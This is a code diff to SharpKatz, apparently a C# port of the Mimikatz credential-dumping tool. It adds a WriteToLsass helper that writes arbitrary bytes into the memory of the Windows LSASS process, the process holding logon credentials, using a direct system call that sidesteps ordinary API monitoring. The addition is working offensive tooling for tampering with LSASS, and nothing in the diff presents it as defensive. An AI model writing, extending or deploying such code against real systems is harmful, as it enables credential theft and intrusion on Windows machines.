@@ -136,6 +136,17 @@ namespace SharpKatz
             return bytev;
         }
 
+        public static bool WriteToLsass(ref IntPtr hLsass, IntPtr addr, byte[] bytesToWrite)
+        {
+            IntPtr bytesWrited = IntPtr.Zero;
+            GCHandle pbytesToWritepinnedArray = GCHandle.Alloc(bytesToWrite, GCHandleType.Pinned);
+            IntPtr pbytesToWrite = pbytesToWritepinnedArray.AddrOfPinnedObject();
+
+            NTSTATUS status = SysCall.NtWriteVirtualMemory10(hLsass, addr, pbytesToWrite, (uint)bytesToWrite.Length, ref bytesWrited);
+
+            return (status == NTSTATUS.Success);
+        }
+
         public static T ReadStruct<T>(byte[] array)
             where T : struct
         {
@@ -264,7 +275,6 @@ namespace SharpKatz
             Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
             return resBytes;
         }
-
 
         public static byte[] StringToByteArray(string hex)
         {
